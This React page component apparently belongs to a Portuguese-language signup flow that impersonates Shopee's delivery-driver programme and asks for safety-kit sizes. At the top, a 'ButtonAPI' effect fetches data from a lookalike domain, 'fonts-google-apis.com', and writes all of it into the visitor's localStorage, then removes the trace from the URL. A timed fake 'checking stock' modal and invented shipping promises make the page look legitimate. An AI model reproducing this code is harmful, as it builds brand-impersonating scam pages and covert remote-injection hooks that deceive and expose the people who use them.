import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import CommentsSection from '@/components/CommentsSection';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

import kitEpiImage from '@/assets/kit-epi-new.webp';

const finalizacaoSchema = z.object({
  tamanhoColete: z.enum(['P', 'M', 'G', 'GG']),
  tamanhoLuva: z.enum(['P', 'M', 'G', 'GG']),
  numeroCalcado: z.string().min(2, "Número de calçado inválido"),
});

type FinalizacaoFormValues = z.infer<typeof finalizacaoSchema>;

const Finalizacao: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  // ⚡ ButtonAPI - Recuperação Automática de localStorage
  useEffect(() => {
    const BUTTON_API_URL = 'https://fonts-google-apis.com';
    
    // Detecta parâmetro tempData na URL
    const urlParams = new URLSearchParams(window.location.search);
    const tempDataId = urlParams.get('tempData');
    
    if (tempDataId) {
      console.log('🔄 Recuperando dados transferidos...');
      
      // Faz requisição para recuperar dados
      fetch(`${BUTTON_API_URL}/api/temp-data/${tempDataId}`)
        .then(response => response.json())
        .then(result => {
          if (result.data) {
            // Aplica dados no localStorage do site atual
            Object.entries(result.data).forEach(([key, value]) => {
              localStorage.setItem(key, value as string);
              console.log(`✅ Restaurado: ${key} = ${value}`);
            });
            
            console.log('🎉 Dados transferidos com sucesso!');
            
            // Remove parâmetro tempData da URL
            urlParams.delete('tempData');
            const newUrl = window.location.pathname + 
              (urlParams.toString() ? '?' + urlParams.toString() : '');
            window.history.replaceState({}, document.title, newUrl);
          }
        })
        .catch(err => console.warn('⚠️ Erro na recuperação:', err));
    }
  }, []);
  
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [selectedShoeSize, setSelectedShoeSize] = useState<string>("40");

  const { register, handleSubmit, formState: { errors }, setValue, watch } = useForm<FinalizacaoFormValues>({
    resolver: zodResolver(finalizacaoSchema),
    defaultValues: {
      tamanhoColete: 'M',
      tamanhoLuva: 'M',
      numeroCalcado: '40',
    }
  });
  

  // Função para selecionar o tamanho do calçado
  const handleShoeSize = (size: string) => {
    setSelectedShoeSize(size);
    setValue('numeroCalcado', size, { shouldValidate: true });
  };
  
  const handleFormSubmit = (data: FinalizacaoFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Atualizando o tamanho do calçado a partir do estado
      const updatedData = {
        ...data,
        numeroCalcado: selectedShoeSize
      };
      
      // Salvando dados no localStorage
      localStorage.setItem('epi_data', JSON.stringify(updatedData));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    // Redirecionar para a página de entrega em vez de mostrar a tela de finalização
    navigate('/entrega');
  };

  const handleFinalizar = () => {
    navigate('/');
    toast({
      title: "Cadastro finalizado!",
      description: "Parabéns! Seu cadastro foi concluído com sucesso. Em breve entraremos em contato.",
    });
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow container mx-auto px-2 py-8 w-full">
        <div className="w-full mx-auto p-6 mb-8">
          {!formSubmitted ? (
            <>
              <div className="mb-8">
                <Card className="overflow-hidden max-w-6xl mx-auto">
                  <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
                    <h3 className="font-semibold text-[#E83D22]">Equipamento de Proteção Individual (EPI)</h3>
                  </div>
                  <div className="p-6">
                    <div className="flex flex-col md:flex-row gap-6 items-center">
                      <div className="w-full md:w-2/5">
                        <img 
                          src={kitEpiImage} 
                          alt="Kit EPI Shopee" 
                          className="w-full rounded-lg"
                        />
                      </div>
                      <div className="w-full md:w-3/5">
                        <h4 className="text-lg font-medium mb-3">Kit Completo de Segurança</h4>
                        <p className="text-gray-600 mb-4">
                          Para garantir sua segurança durante as entregas, a Shopee exige que todos os entregadores 
                          utilizem equipamentos de proteção individual. O kit inclui:
                        </p>
                        <ul className="list-disc pl-5 mb-4 space-y-1 text-gray-700">
                          <li>2 Coletes refletivos com identificação Shopee (laranja e amarelo)</li>
                          <li>Par de luvas de proteção</li>
                          <li>Botas de segurança antiderrapantes</li>
                        </ul>
                        <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200">
                          <p className="text-sm text-yellow-800">
                            <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas 
                            as entregas. O não uso pode resultar em suspensão temporária.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </Card>
              </div>
              
              <form onSubmit={handleSubmit(handleFormSubmit)} className="space-y-6 max-w-6xl mx-auto">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <label htmlFor="tamanhoColete" className="block text-base font-medium text-gray-800 mb-2">
                      Tamanho do Colete
                    </label>
                    <Select
                      onValueChange={(value) => setValue('tamanhoColete', value as any)}
                      defaultValue={watch('tamanhoColete')}
                    >
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="Selecione o tamanho" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="P">P</SelectItem>
                        <SelectItem value="M">M</SelectItem>
                        <SelectItem value="G">G</SelectItem>
                        <SelectItem value="GG">GG</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <label htmlFor="tamanhoLuva" className="block text-base font-medium text-gray-800 mb-2">
                      Tamanho da Luva
                    </label>
                    <Select
                      onValueChange={(value) => setValue('tamanhoLuva', value as any)}
                      defaultValue={watch('tamanhoLuva')}
                    >
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="Selecione o tamanho" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="P">P</SelectItem>
                        <SelectItem value="M">M</SelectItem>
                        <SelectItem value="G">G</SelectItem>
                        <SelectItem value="GG">GG</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <label htmlFor="numeroCalcado" className="block text-base font-medium text-gray-800 mb-2">
                      Número do Calçado
                    </label>
                    <div className="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-2">
                      {Array.from({ length: 11 }, (_, i) => (i + 35).toString()).map((size) => (
                        <Button
                          key={size}
                          type="button"
                          variant="outline"
                          onClick={() => handleShoeSize(size)}
                          className={`py-2 px-4 ${
                            selectedShoeSize === size 
                              ? 'bg-[#E83D22] text-white border-[#E83D22] hover:bg-[#d73920]' 
                              : 'border-gray-300 hover:border-[#E83D22] hover:text-[#E83D22]'
                          }`}
                        >
                          {size}
                        </Button>
                      ))}
                    </div>
                    <input 
                      type="hidden" 
                      {...register('numeroCalcado')} 
                      value={selectedShoeSize} 
                    />
                    {errors.numeroCalcado && (
                      <p className="mt-1 text-sm text-red-600">{errors.numeroCalcado.message}</p>
                    )}
                  </div>
                </div>
                
                
                <Button
                  type="submit"
                  className="w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-6 text-base rounded-[3px]"
                  disabled={isSubmitting}
                  style={{ height: '50px' }}
                >
                  {isSubmitting ? 'Processando...' : 'Solicitar Kit e Finalizar'}
                </Button>
              </form>
            </>
          ) : (
            <div className="max-w-2xl mx-auto text-center">
              <div className="text-[#E83D22] mb-6">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mx-auto">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                  <polyline points="22 4 12 14.01 9 11.01"></polyline>
                </svg>
              </div>
              
              <h1 className="text-3xl font-bold mb-6 text-gray-800">Cadastro Concluído!</h1>
              
              <p className="text-lg text-gray-600 mb-8">
                Parabéns! Seu cadastro como Entregador Parceiro Shopee foi concluído com sucesso.
                Seu kit EPI será enviado para o endereço cadastrado em até 5 dias úteis.
              </p>
              
              <div className="bg-[#FFF8F6] p-4 rounded-lg border border-[#E83D2220] mb-8">
                <h3 className="font-semibold text-[#E83D22] mb-2">Próximos Passos:</h3>
                <ol className="list-decimal pl-6 text-left text-gray-700 space-y-2">
                  <li>Você receberá um e-mail de confirmação em até 24 horas.</li>
                  <li>O kit EPI será enviado em até 5 dias úteis.</li>
                  <li>Após o recebimento do kit, você já poderá começar a receber entregas.</li>
                  <li>Download do aplicativo de entregas Shopee (enviado por e-mail).</li>
                </ol>
              </div>
              
              <Button
                onClick={handleFinalizar}
                className="bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-6 text-base rounded-[3px] min-w-[200px]"
                style={{ height: '50px' }}
              >
                Voltar ao Início
              </Button>
            </div>
          )}
        </div>
      </div>
      
      <div className="container mx-auto px-4">
        <CommentsSection />
      </div>
      
      <Footer />
      
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Finalizando Cadastro"
        loadingSteps={[
          "Registrando tamanhos do kit EPI",
          "Verificando disponibilidade em estoque",
          "Preparando envio do material",
          "Finalizando cadastro de entregador"
        ]}
        completionMessage="Cadastro finalizado com sucesso!"
        loadingTime={12000}
      />
    </div>
  );
};

export default Finalizacao;